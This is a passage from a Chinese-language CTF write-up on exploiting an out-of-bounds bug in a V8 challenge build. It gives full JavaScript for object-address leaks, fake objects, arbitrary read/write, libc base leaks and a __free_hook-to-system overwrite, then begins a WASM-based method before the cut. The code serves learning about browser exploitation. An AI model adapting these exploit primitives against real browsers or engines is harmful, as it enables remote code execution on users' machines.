<p>显示创建了一个数组 <code>fake_array</code>，用于伪造数组对象，再通过 <code>addressOf(fake_array) - 0x40n + 0x10n;</code> 获得伪造对象的地址，由于 Float 数组的 elements 指针指向的地方刚好紧挨在 <code>fake_array</code> 的 map 前面，即 <code>fake_array</code> 地址之前，数组6个元素占用 0x30 的大小，加上 elements 的 map 和 length 字段又占用 0x10 的大小，则 <code>addressOf(fake_array) - 0x40n</code> 就是 elements 指针指向的地方，那么 <code>addressOf(fake_array) - 0x40n + 0x10n;</code> 就是存储 6 个元素的起始地址</p>
<p>调试一下，可以发现 <code>fake_obj_addr</code> 计算正确<br><img src="/images/3b546c3b/pasted-17.png" alt="starctf5"><br><img src="/images/3b546c3b/pasted-18.png" alt="starctf6"></p>
<p>此时只需要通过<code>fake_array[2] = target_addr - 0x10n</code> 更改 <code>fake_obj</code> 的 elements 指针，然后使用 <code>fake_obj[0] = value</code>，即可对地址 <code>target_addr</code> 写入 <code>value</code> 值，同理可以任意读，代码如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	fake_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token function">f2i</span><span class="token punctuation">(</span>fake_obj<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">return</span> data<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">write64</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>	
	fake_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	fake_obj<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>关掉地址随机化，尝试下面代码，来泄露 <code>__libc_start_main</code> 的地址</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> leak_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token number">0x555555554000n</span><span class="token operator">+</span><span class="token number">0x0000012a47b0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'leak_addr = '</span> <span class="token operator">+</span> leak_addr<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>可以看到任意读是没有问题的：<br><img src="/images/3b546c3b/pasted-20.png" alt="starctf7"><br><img src="/images/3b546c3b/pasted-21.png" alt="starctf8"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>有了任意读写，控制程序执行流的方式还是很多的，下面就分为传统方式和非传统方式来利用</p>
<h4 id="传统方式"><a href="#传统方式" class="headerlink" title="传统方式"></a>传统方式</h4><p>传统方式中，可以泄露 libc 地址，修改 <code>__free_hook</code> 为 system，或者用 one_gadget 的方式，无论哪种方式，泄露 libc 地址都是首要的任务</p>
<p>泄露的方式了解到有两种，一种是从一个 v8 对象的地址开始，内存搜索附近的内容，查看有无程序二进制空间的地址，计算得出程序及地址，之后通过基地址加偏移得到 got 表的地址，泄露 got 表项即可泄露 libc 地址，但是这种方式不太稳定，万一遇到内存不可读程序就中止了，所以这里学习另一种稳定的泄露方式</p>
<p>调试观察下面代码：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>查看对象 <code>a</code> 的结构<br><img src="/images/3b546c3b/pasted-22.png" alt="pwn1_1"></p>
<p>再查看其 map 类型的结构<br><img src="/images/3b546c3b/pasted-23.png" alt="pwn1_2"></p>
<p>查看 map 的 constructor 结构<br><img src="/images/3b546c3b/pasted-24.png" alt="pwn1_3"></p>
<p>在 code 的固定偏移处有程序二进制空间的地址，<br><img src="/images/3b546c3b/pasted-25.png" alt="pwn1_4"><br><img src="/images/3b546c3b/pasted-26.png" alt="pwn1_5"></p>
<p>下面代码即可泄露出程序基地址：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> code_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token function">addressOf</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>constructor<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x30n</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'code_addr = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>code_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> v8_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>code_addr <span class="token operator">+</span> <span class="token number">0x42n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> v8_base <span class="token operator">=</span> v8_addr <span class="token operator">-</span> <span class="token number">0x94f780n</span> <span class="token operator">-</span> <span class="token number">0x679000n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'v8_base = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>v8_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后泄露 libc 地址，改 <code>__free_hook</code> 为 system 一把梭</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> free_got_addr <span class="token operator">=</span> v8_base <span class="token operator">+</span> <span class="token number">0x12aa8b8n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'free_got = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>free_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> free_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>free_got_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'free = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>free_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> lbase <span class="token operator">=</span> free_addr <span class="token operator">-</span> <span class="token number">0x9d850n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x1eeb28n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> system <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x55410n</span><span class="token punctuation">;</span>

<span class="token function">write64</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">,</span> system<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//%SystemBreak();</span>

<span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> cmd <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是这样会出现一个段错误，这是 <code>write64</code> FloatArray 对浮点数的处理方式造成的，当值以 0x7f 开头等高处的地址都会出现这种问题，参考的文章使用了 DataView 来改写任意写的方式来解决了这个问题</p>
<p>DataView 对象偏移 <code>+0x20</code> 处，存有一个 backing_store 指针，该指针指向真正存储数据的地址，改写这个指针即可任意读写，而且不会发生 FloatArray 出现的问题，代码如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> buf_backing_store_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span> <span class="token operator">+</span> <span class="token number">0x20n</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">write64_view</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">write64</span><span class="token punctuation">(</span>buf_backing_store_addr<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">i2f</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后使用 <code>write64_view</code> 代替 <code>write64</code> 即可</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">write64_view</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">,</span> system<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//%SystemBreak();</span>

<span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> cmd <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">write64_view</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 恢复 __free_hook 使得程序正常退出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>完整 exp 如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"a"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> obj_array <span class="token operator">=</span> <span class="token punctuation">[</span>obj<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float_array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// leak map</span>
<span class="token keyword">var</span> obj_array_map <span class="token operator">=</span> obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float_array_map <span class="token operator">=</span> float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



<span class="token comment">//leak address of obj</span>
<span class="token comment">//obj_to_leak: Object</span>
<span class="token comment">//return: integer</span>
<span class="token keyword">function</span> <span class="token function">addressOf</span><span class="token punctuation">(</span><span class="token parameter">obj_to_leak</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	obj_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj_to_leak<span class="token punctuation">;</span>
	obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>float_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//类型混淆</span>

	<span class="token keyword">let</span> obj_addr <span class="token operator">=</span> obj_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>obj_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//恢复类型</span>

	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>obj_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//create fake object</span>
<span class="token comment">//addr_to_fake: interger</span>
<span class="token keyword">function</span> <span class="token function">fakeObject</span><span class="token punctuation">(</span><span class="token parameter">addr_to_fake</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

	float_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr_to_fake<span class="token punctuation">)</span><span class="token punctuation">;</span>
	float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>obj_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">let</span> faked_obj <span class="token operator">=</span> float_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>float_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> faked_obj<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> bigUint64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//float to integer</span>
<span class="token keyword">function</span> <span class="token function">f2i</span><span class="token punctuation">(</span><span class="token parameter">f</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	float64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">;</span>

	<span class="token keyword">return</span> bigUint64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//integer to float</span>
<span class="token keyword">function</span> <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	bigUint64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>

	<span class="token keyword">return</span> float64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//hex</span>
<span class="token keyword">function</span> <span class="token function">hex</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> i<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token comment">//create fake array obj</span>
<span class="token keyword">var</span> fake_array <span class="token operator">=</span> <span class="token punctuation">[</span>
    float_array_map<span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0x41414141n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0x1000000000n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token number">1.1</span><span class="token punctuation">,</span>
    <span class="token number">2.2</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>


<span class="token keyword">var</span> fake_obj_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>fake_array<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x40n</span> <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">;</span>
<span class="token comment">//console.log('fake_obj_addr = ' + hex(fake_obj_addr));</span>
<span class="token keyword">var</span> fake_obj <span class="token operator">=</span> <span class="token function">fakeObject</span><span class="token punctuation">(</span>fake_obj_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	fake_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token function">f2i</span><span class="token punctuation">(</span>fake_obj<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">return</span> data<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">write64</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>	
	fake_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	fake_obj<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> buf_backing_store_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span> <span class="token operator">+</span> <span class="token number">0x20n</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">write64_view</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">write64</span><span class="token punctuation">(</span>buf_backing_store_addr<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">i2f</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> code_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token function">addressOf</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>constructor<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x30n</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'code_addr = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>code_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> v8_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>code_addr <span class="token operator">+</span> <span class="token number">0x42n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> v8_base <span class="token operator">=</span> v8_addr <span class="token operator">-</span> <span class="token number">0x94f780n</span> <span class="token operator">-</span> <span class="token number">0x679000n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'v8_base = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>v8_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> free_got_addr <span class="token operator">=</span> v8_base <span class="token operator">+</span> <span class="token number">0x12aa8b8n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'free_got = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>free_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> free_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>free_got_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'free = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>free_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> lbase <span class="token operator">=</span> free_addr <span class="token operator">-</span> <span class="token number">0x9d850n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x1eeb28n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> system <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x55410n</span><span class="token punctuation">;</span>

<span class="token function">write64_view</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">,</span> system<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//%SystemBreak();</span>

<span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> cmd <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">write64_view</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>成功执行命令弹出计算器：<br><img src="/images/3b546c3b/pasted-27.png" alt="pwn1"></p>
<p>题目的 chrome 可执行文件，got 表的偏移不太一样，修改后，泄露地址都是正确的，但是不知道为什么这种方式没有成功弹出计算器</p>
<h4 id="非传统利用方式"><a href="#非传统利用方式" class="headerlink" title="非传统利用方式"></a>非传统利用方式</h4><p>另一种方式和 WASM 有关系，首先利用这个网站 <a href="https://wasdk.github.io/WasmFiddle/，生成一段">https://wasdk.github.io/WasmFiddle/，生成一段</a> wasm<br><img src="/images/3b546c3b/pasted-28.png" alt="pwn2_1"></p>
<p>调试下面代码</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> wasmCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token 